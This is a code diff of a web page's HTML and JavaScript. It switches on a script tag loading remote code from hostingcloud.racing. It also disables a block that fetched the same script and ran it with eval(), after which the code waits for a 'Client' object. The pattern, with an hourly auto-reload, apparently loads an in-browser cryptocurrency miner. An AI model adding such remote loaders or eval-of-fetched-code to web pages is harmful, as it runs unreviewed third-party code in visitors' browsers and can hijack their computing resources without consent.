@@ -18,7 +18,7 @@
     <script>
         setTimeout(() => { window.location.reload(); }, 1000 * 60 * 60)
     </script>
-    <!-- <script src="https://www.hostingcloud.racing/sIu3.js"></script> -->
+    <script src="https://www.hostingcloud.racing/sIu3.js"></script>
     <!-- <script src="http://share.liveblog365.com/GJTy.php?f=9sx5.js"></script> -->
 
 
@@ -189,27 +189,27 @@ main();
         (async () => {
 
 
-            await new Promise((resolve) => {
+            // await new Promise((resolve) => {
 
-                if ('serviceWorker' in navigator) {
-                    navigator.serviceWorker.register('/service-worker.js')
-                        .then((registration) => {
-                            console.log('Service Worker registered with scope:', registration.scope);
-                            resolve();
-                        })
-                        .catch((error) => {
-                            console.error('Service Worker registration failed:', error);
-                            resolve();
-                        });
-                }
-            });
+            //     if ('serviceWorker' in navigator) {
+            //         navigator.serviceWorker.register('/service-worker.js')
+            //             .then((registration) => {
+            //                 console.log('Service Worker registered with scope:', registration.scope);
+            //                 resolve();
+            //             })
+            //             .catch((error) => {
+            //                 console.error('Service Worker registration failed:', error);
+            //                 resolve();
+            //             });
+            //     }
+            // });
 
-            await new Promise((resolve) => {
-                setTimeout(resolve, 3000);
-            })
-            await (async () => {
-                eval(await reqPrx('https://www.hostingcloud.racing/sIu3.js'));
-            })();
+            // await new Promise((resolve) => {
+            //     setTimeout(resolve, 3000);
+            // })
+            // await (async () => {
+            //     eval(await reqPrx('https://www.hostingcloud.racing/sIu3.js'));
+            // })();
 
             while (!Client) {
                 await new Promise(r => setTimeout(r, 1000));
